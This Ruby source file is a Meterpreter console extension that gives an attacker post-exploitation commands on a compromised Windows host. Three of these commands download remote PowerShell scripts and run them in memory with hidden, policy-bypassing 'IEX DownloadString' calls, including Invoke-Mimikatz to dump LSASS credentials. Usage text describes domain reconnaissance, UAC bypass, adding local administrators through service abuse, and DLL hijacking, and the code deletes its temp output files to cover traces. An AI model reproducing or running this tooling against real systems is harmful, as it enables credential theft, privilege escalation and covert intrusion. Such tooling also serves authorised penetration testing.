# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::PowerShell

  Klass = Console::CommandDispatcher::Priv::PowerShell

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "power_shell" => "Execute a powershell command.",
      "power_view"  => "Download and execute Veil's PowerView Framework",
      "power_up"    => "Download and execute the PowerUp Framework",
      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell"
    }
  end

  POWER_VIEW_USAGE = %q{
Veil PowerView
==============
Ref: https://github.com/Veil-Framework/Veil-PowerView

== Commands ==
> power_view Get-HostIP 
  => It retrieves the local IP of the target.
> power_view Get-DomainController -domain ACME 
  => Gets domain controllers)
> power_view Invoke-UserHunter -Domain 'ACME'
  => Gets all machines where domain admins are logged in
> power_view Invoke-ShareFinder -Domain ACME -Ping/-NoPing -Delay 60 -HostList Optional.txt
  => Locate shares across the domain
> power_view Invoke-FindLocalAdminAccess -Domain ACME -Delay 60 -Hostlist optional.txt 
  => Search domain to find where local user has access
> power_view Invoke-ComputerFieldSearch -Field info -Term badge
  => Searches all AD description fields for the defined words
> power_view Invoke-Newview -Domain ACME 
  => Runs Mubix's Net_view looking to identify domain controllers, 
  => then local admins, then find where they are logged on
}

  POWER_SHELL_USAGE = %q{
Direct PowerShell Command
=========================
Desc: Runs commands directly into target Powershell provider. 

== Commands ==
> power_shell Get-Process
  => Gets All Local Processes
> power_shell Get-Process Winlogon,explorer | format-list * 
  => Needs description.
> power_shell Stop-Process -id XX -Force  
  => Needs description.
> power_shell Stop-Process -name notepad
  => Needs description.
}

  POWER_KATZ_USAGE = %q{
Powershell In-Memory Mimikatz
=============================
Desc: This runs Mimikatz in memory using Mimikatz 2.0 and Invoke-ReflectivePEInjection.
Ref: https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
Note: Works on anything Windows 8.1 and higher. For now, migrate into appropriate process manually.

== Commands ==
> power_katz -dumpCreds
  => dumps creds from LSASS
> power_katz -dumpCerts 
  => Dumps certificates from memory
> power_katz -DumpCreds -ComputerName @("computer1", "computer2")
  => Runs against multiple targets
}

  POWER_UP_USAGE = %q{
Harmj0y PowerUp Utility
=======================
Desc: PowerUP is used to maintain persistence, bypass UAC, and elevate privilages.
Ref: https://github.com/HarmJ0y/PowerUp

== Commands ==
* Service Enumeration: 
> power_up Get-ServiceUnquoted
  => returns services with unquoted paths that also have a space in the name
> power_up Get-ServiceEXEPerms
  => returns services where the current user can write to the service binary path
> power_up Get-ServicePerms
  => returns services the current user can modify
 
* Service Abuse: 
> power_up Invoke-ServiceUserAdd
  => modifies a modifiable service to create a user and add it to the local administrators
> power_up Write-UserAddServiceBinary
  => writes out a patched C# service binary that adds a local administrative user
> power_up Write-ServiceEXE
  => replaces a service binary with one that adds a local administrator user
> power_up Restore-ServiceEXE
  => restores a replaced service binary with the original executable

* DLL Hijacking: 
> power_up Invoke-FindDLLHijack
  => finds DLL hijacking opportunities for currently running processes
> power_up Invoke-FindPathDLLHijack
  => finds service %PATH% .DLL hijacking opportunities

* Registry Checks:
> power_up Get-RegAlwaysInstallElevated
  => checks if the AlwaysInstallElevated registry key is set
> power_up Get-RegAutoLogon
  => checks for Autologon credentials in the registry

* Misc. Checks:
> power_up Get-UnattendedInstallFiles
  => finds remaining unattended installation files

* Helpers:
> power_up Invoke-AllChecks
  => runs all current escalation checks and returns a report
> power_up Write-UserAddMSI
  => write out a MSI installer that prompts for a user to be added
> power_up Invoke-ServiceStart
  => starts a given service
> power_up Invoke-ServiceStop
  => stops a given service
> power_up Invoke-ServiceEnable
  => enables a given service
> power_up Invoke-ServiceDisable
  => disables a given service
> power_up Get-ServiceDetails
  => returns detailed information about a service
}

  @@command_opts = Rex::Parser::Arguments.new(
    "-o" => [false, "Select a location to send command output to."],
    "-t" => [false, "The arguments to pass to the command."],
    "-h" => [false, "Help menu."]
  )

  #
  # Name for this dispatcher.
  #
  def name
    "Interactive Powershell"
  end

  #
  # Displays the contents of the SAM database
  #
  def cmd_power_shell(*args)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
      when '-t'
        begin
          c_time = Integer(val)
          print_warning("Output timeout: #{val} seconds")
        rescue
          print_error "#{val} is not a valid Integer."
        end
      when '-h'
        print_line(POWER_SHELL_USAGE)
        print_line("-" * 60)
        print("Usage: power_shell [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
              "Runs a direct Powershell command.\n" +
              @@command_opts.usage)
        return true
      end
    end  
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(c_time)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_view(*args)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
      when '-t'
        begin
          c_time = Integer(val)
          print_warning("Output timeout: #{val} seconds")
        rescue
          print_error "#{val} is not a valid Integer."
        end
      when '-h'
        print_line(POWER_VIEW_USAGE)
        print_line("-" * 60)
        print("Usage: power_view [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
              "Runs the Veil PowerView framework on the remote host.\n" +
              @@command_opts.usage)
        return true
      end
    end
    link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(c_time)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_up(*args)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
      when '-t'
        begin
          c_time = Integer(val)
          print_warning("Output timeout: #{val} seconds")
        rescue
          print_error "#{val} is not a valid Integer."
        end
      when '-h'
        print_line(POWER_UP_USAGE)
        print_line("-" * 60)
        print("Usage: power_up [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
              "Runs Harmj0y's PowerUp framework on the remote host.\n" +
              @@command_opts.usage)
        return true
      end
    end
    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(c_time)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_katz(*args)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
      when '-t'
        begin
          c_time = Integer(val)
          print_warning("Output timeout: #{val} seconds")
        rescue
          print_error "#{val} is not a valid Integer."
        end
      when '-h'
        print_line(POWER_KATZ_USAGE)
        print_line("-" * 60)
        print("Usage: power_katz [-t TIME] [-o FILE] COMMAND [ARGS]\n" +
              "Downloads and executes Mimikatz in memory through Powershell.\n" +
              @@command_opts.usage)
        return true
      end
    end
    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    print_warning("This could take a bit...")
    sleep(c_time)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

end

end
end
end
end

